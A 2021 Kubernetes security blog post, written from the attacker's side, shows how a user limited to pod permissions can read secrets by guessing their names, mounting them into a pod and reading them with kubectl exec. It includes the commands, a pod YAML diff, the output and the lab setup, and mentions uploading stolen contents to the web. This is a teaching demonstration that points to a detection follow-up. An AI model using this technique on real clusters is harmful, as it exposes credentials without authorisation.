---
author: "Suraj Deshmukh"
date: "2021-05-08T12:17:07+05:30"
title: "Access Any Kubernetes Secret"
description: "A little trickery and access any Kubernetes Secret!"
draft: false
categories: ["kubernetes", "security"]
tags: ["kubernetes", "security"]
images:
- src: "/post/2021/05/access-k8s-secrets/forbidden.jpg"
  alt: "Forbidden"
---

Photo by [Kyle Glenn]("https://unsplash.com/@kylejglenn") on [Unsplash]("https://unsplash.com").


You can gain access to any secret that you want in Kubernetes even if you don't have RBAC permissions to get, list or view that secret. All you need is permission that allows you to do anything on pods and an ability to guess the names of secrets. With these two ingredients, here is how you can access any secret out there.

## Nasty User

Here is a user called `nastyuser` who can only do stuff on pod objects. Everything else is forbidden.
The user cannot list secrets, namespaces or deployments:

```bash
$ kubectl get ns
Error from server (Forbidden): namespaces is forbidden: User "nastyuser" cannot list resource "namespaces" in API group "" at the cluster scope

$ kubectl get secrets
Error from server (Forbidden): secrets is forbidden: User "nastyuser" cannot list resource "secrets" in API group "" in the namespace "default"

$ kubectl get deploy
Error from server (Forbidden): deployments.apps is forbidden: User "nastyuser" cannot list resource "deployments" in API group "apps" in the namespace "default"
```

The user has access to `pods` and `pods/exec` and a bunch of other things that are required for a user to have functional access to the Kubernetes:

```bash
$ kubectl auth can-i --list
Resources                                       Non-Resource URLs   Resource Names   Verbs
pods/exec                                       []                  []               [*]
pods                                            []                  []               [*]
selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]
                                                [/api/*]            []               [get]
                                                [/api]              []               [get]
                                                [/apis/*]           []               [get]
                                                [/apis]             []               [get]
                                                [/healthz]          []               [get]
                                                [/healthz]          []               [get]
                                                [/livez]            []               [get]
                                                [/livez]            []               [get]
                                                [/openapi/*]        []               [get]
                                                [/openapi]          []               [get]
                                                [/readyz]           []               [get]
                                                [/readyz]           []               [get]
                                                [/version/]         []               [get]
                                                [/version/]         []               [get]
                                                [/version]          []               [get]
                                                [/version]          []               [get]
```

**NOTE:** You will need at least `pods/exec` or `pods/logs` to see the content of the secret using the generic bash tools. If you don't have this extra permission, you can create a script that reads contents and uploads the contents somewhere, which you can access from over the web. For the sake of simplicity, I chose `pods/exec` as extra permission.

**NOTE:** How you gain access to a kubeconfig that has the aforementioned authorisation is out of the scope of this blog. It is possible to gain access somehow to the host and fortuitously gain access to the service account token secret that has previously mentioned permissions.

## Do what you can!

Now how do you gain access to secrets with RBAC permissions only for pods? Your social skills and guesswork is going to help you find the name of the secrets. But even if you guess the name of the secret, you cannot access the secret the kubectl way since RBAC won't let you do that. So you will use the only permission you have on the Kubernetes cluster, which is creating pods.

> If you don't have access to the Kubernetes secret but know the name of the Kubernetes secret, you can simply
> 1) Create a pod.
> 2) Mount that secret into the pod.
> 3) Kubelet will happily give it to you regardless of your RBAC permissions to access the secret.

Let's see that in action. Start by creating a dummy pod config:

```yaml
$ kubectl run sleep --image=fedora --dry-run=client -o yaml -- sleep infinity > pod.yaml
$ cat pod.yaml
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    run: sleep
  name: sleep
spec:
  containers:
  - args:
    - sleep
    - infinity
    image: fedora
    name: sleep
    resources: {}
  dnsPolicy: ClusterFirst
  restartPolicy: Always
status: {}
```

Now add the following changes to the config. Here we are mounting a secret inside the pod at path `/access-secret`. Once the pod is up and running, we will find the mounted secret in this directory. We will replace the `secretName` field value from `GUESSED_SECRET` with something else as we keep on guessing.

```diff
diff --git pod.yaml pod.yaml
index 479a53d..2376fe3 100644
--- pod.yaml
+++ pod.yaml
@@ -13,6 +13,13 @@ spec:
     image: fedora
     name: sleep
     resources: {}
+    volumeMounts:
+    - name: hackedsecret
+      mountPath: /access-secret/
   dnsPolicy: ClusterFirst
   restartPolicy: Always
+  volumes:
+  - name: hackedsecret
+    secret:
+      secretName: GUESSED_SECRET
 status: {}
```

## Attempt 1st

Use `sed` to replace the string `GUESSED_SECRET` and create the pod out of it:

```bash
$ sed 's|GUESSED_SECRET|admin|g' pod.yaml | kubectl create -f -
pod/sleep created
```

Now check the pod:

```bash
$ kubectl get pods
NAME    READY   STATUS              RESTARTS   AGE
sleep   0/1     ContainerCreating   0          96s
```

The pod is in `ContainerCreating` state for more than a minute that means the secret does not exist, and Kubelet is failing to mount it in the pod. Describing the pod won't tell us anything because we don't have access to the events.

```bash
$ kubectl describe pod sleep | tail -3
Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:          <none>
```

Cleanup by running the following command:

```bash
$ kubectl delete pod sleep
pod "sleep" deleted
```

## Attempt nth

Let's try a different secret name:

```bash
$ sed 's|GUESSED_SECRET|supersecret|g' pod.yaml | kubectl create -f -
pod/sleep created
```

Let's check the pod status:

```bash
$ kubectl get pods
NAME    READY   STATUS    RESTARTS   AGE
sleep   1/1     Running   0          32s
```

Yay, that means we guessed the secret name correctly. Let's gain access to the pod's terminal to find out the contents of the secrets:

```bash
$ kubectl exec -it sleep bash
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
[root@sleep /]#
```

Now go to the place where the secret is mounted and discover what is in secret.

```bash
[root@sleep ~]# cd /access-secret/
[root@sleep access-secret]# cat data
supersecretvaluesinhere
```

## Conclusion

This post was from the perspective of an attacker. It showed you how you could use guessing the secret name to gain access to any secret you like, of course, with the help of Kubelet.

In the next blog, we will see how to detect this issue and stop it from happening.

## Background Setup

I used the following commands to create a user and assign permissions to that user:

```bash
kubectl create role pod-all --verb=* --resource=pods --resource=pods/exec
kubectl create rolebinding pod-all:nastyuser --role=pod-all --user=nastyuser
kubectl create secret generic supersecret --from-literal data=supersecretvaluesinhere
alias kubectl='kubectl --as=nastyuser'
```
